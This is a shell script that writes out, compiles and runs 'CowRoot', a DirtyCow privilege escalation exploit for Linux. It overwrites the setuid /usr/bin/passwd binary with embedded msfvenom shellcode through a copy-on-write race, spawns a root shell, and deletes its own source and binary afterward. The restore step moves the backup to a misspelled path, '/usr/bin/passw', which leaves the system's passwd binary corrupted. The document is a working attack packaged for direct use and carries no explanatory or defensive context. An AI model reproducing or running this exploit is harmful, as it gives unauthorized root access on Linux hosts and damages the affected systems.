cd ~
if ! [ -z "$(ls | grep CowRoot.c)" ];then
	rm CowRoot.c
fi
if ! [ -z "$(ls | grep cowroot)" ];then
	rm cowroot
fi

echo "/*" >> CowRoot.c 
echo "* (un)comment correct payload first (x86 or x64)!" >> CowRoot.c 
echo "* " >> CowRoot.c 
echo "* $ gcc cowroot.c -o cowroot -pthread" >> CowRoot.c 
echo "* $ ./cowroot" >> CowRoot.c 
echo "* DirtyCow root privilege escalation" >> CowRoot.c 
echo "* Backing up /usr/bin/passwd.. to /tmp/bak" >> CowRoot.c 
echo "* Size of binary: 57048" >> CowRoot.c 
echo "* Racing, this may take a while.." >> CowRoot.c 
echo "* /usr/bin/passwd overwritten" >> CowRoot.c 
echo "* Popping root shell." >> CowRoot.c 
echo "* Don't forget to restore /tmp/bak" >> CowRoot.c 
echo "* thread stopped" >> CowRoot.c 
echo "* thread stopped" >> CowRoot.c 
echo "* root@box:/root/cow# id" >> CowRoot.c 
echo "* uid=0(root) gid=1000(foo) groups=1000(foo)" >> CowRoot.c 
echo "*" >> CowRoot.c 
echo "* @robinverton " >> CowRoot.c 
echo "*/" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "#include <stdio.h>" >> CowRoot.c 
echo "#include <stdlib.h>" >> CowRoot.c 
echo "#include <sys/mman.h>" >> CowRoot.c 
echo "#include <fcntl.h>" >> CowRoot.c 
echo "#include <pthread.h>" >> CowRoot.c 
echo "#include <string.h>" >> CowRoot.c 
echo "#include <unistd.h>" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "void *map;" >> CowRoot.c 
echo "int f;" >> CowRoot.c 
echo "int stop = 0;" >> CowRoot.c 
echo "struct stat st;" >> CowRoot.c 
echo "char *name;" >> CowRoot.c 
echo "pthread_t pth1,pth2,pth3;" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "// change if no permissions to read" >> CowRoot.c 
echo "char suid_binary[] = \"/usr/bin/passwd\";" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "/*" >> CowRoot.c 
echo "* msfvenom -p linux/x64/exec CMD=\"echo '0' > /proc/sys/vm/dirty_writeback_centisecs;/bin/bash\" PrependSetuid=True -f elf | xxd -i" >> CowRoot.c 
echo "*/" >> CowRoot.c 
echo "unsigned char sc[] = {" >> CowRoot.c 
echo "  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00," >> CowRoot.c 
echo "  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0xe3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4e, 0x01, 0x00, 0x00," >> CowRoot.c 
echo "  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00," >> CowRoot.c 
echo "  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99," >> CowRoot.c 
echo "  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48," >> CowRoot.c 
echo "  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8," >> CowRoot.c 
echo "  0x3c, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x27, 0x30, 0x27," >> CowRoot.c 
echo "  0x20, 0x3e, 0x20, 0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x79, 0x73," >> CowRoot.c 
echo "  0x2f, 0x76, 0x6d, 0x2f, 0x64, 0x69, 0x72, 0x74, 0x79, 0x5f, 0x77, 0x72," >> CowRoot.c 
echo "  0x69, 0x74, 0x65, 0x62, 0x61, 0x63, 0x6b, 0x5f, 0x63, 0x65, 0x6e, 0x74," >> CowRoot.c 
echo "  0x69, 0x73, 0x65, 0x63, 0x73, 0x3b, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62," >> CowRoot.c 
echo "  0x61, 0x73, 0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05" >> CowRoot.c 
echo "};" >> CowRoot.c 
echo "unsigned int sc_len = 227;" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "void *madviseThread(void *arg)" >> CowRoot.c 
echo "{" >> CowRoot.c 
echo "    char *str;" >> CowRoot.c 
echo "    str=(char*)arg;" >> CowRoot.c 
echo "    int i,c=0;" >> CowRoot.c 
echo "    for(i=0;i<1000000 && !stop;i++) {" >> CowRoot.c 
echo "        c+=madvise(map,100,MADV_DONTNEED);" >> CowRoot.c 
echo "    }" >> CowRoot.c 
echo "}" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "void *procselfmemThread(void *arg)" >> CowRoot.c 
echo "{" >> CowRoot.c 
echo "    char *str;" >> CowRoot.c 
echo "    str=(char*)arg;" >> CowRoot.c 
echo "    int f=open(\"/proc/self/mem\",O_RDWR);" >> CowRoot.c 
echo "    int i,c=0;" >> CowRoot.c 
echo "    for(i=0;i<1000000 && !stop;i++) {" >> CowRoot.c 
echo "        lseek(f,map,SEEK_SET);" >> CowRoot.c 
echo "        c+=write(f, str, sc_len);" >> CowRoot.c 
echo "    }" >> CowRoot.c 
echo "}" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "void *waitForWrite(void *arg) {" >> CowRoot.c 
echo "    char buf[sc_len];" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "    for(;;) {" >> CowRoot.c 
echo "        FILE *fp = fopen(suid_binary, \"rb\");" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "        fread(buf, sc_len, 1, fp);" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "        if(memcmp(buf, sc, sc_len) == 0) {" >> CowRoot.c 
echo "            break;" >> CowRoot.c 
echo "        }" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "        fclose(fp);" >> CowRoot.c 
echo "        sleep(1);" >> CowRoot.c 
echo "    }" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "    stop = 1;" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "    system(suid_binary);" >> CowRoot.c 
echo "}" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "int main(int argc,char *argv[]) {" >> CowRoot.c 
echo "    char *backup;" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "    asprintf(&backup, \"cp %s /tmp/bak\", suid_binary);" >> CowRoot.c 
echo "    system(backup);" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "    f = open(suid_binary,O_RDONLY);" >> CowRoot.c 
echo "    fstat(f,&st);" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "    char payload[st.st_size];" >> CowRoot.c 
echo "    memset(payload, 0x90, st.st_size);" >> CowRoot.c 
echo "    memcpy(payload, sc, sc_len+1);" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "    pthread_create(&pth1, NULL, &madviseThread, suid_binary);" >> CowRoot.c 
echo "    pthread_create(&pth2, NULL, &procselfmemThread, payload);" >> CowRoot.c 
echo "    pthread_create(&pth3, NULL, &waitForWrite, NULL);" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "    pthread_join(pth3, NULL);" >> CowRoot.c 
echo "" >> CowRoot.c 
echo "    return 0;" >> CowRoot.c 
echo "}" >> CowRoot.c

clear
chmod 777 CowRoot.c
gcc CowRoot.c -o cowroot -pthread
rm CowRoot.c
chmod 777 cowroot
clear

./cowroot

mv /tmp/bak /usr/bin/passw
cd ~
rm cowroot
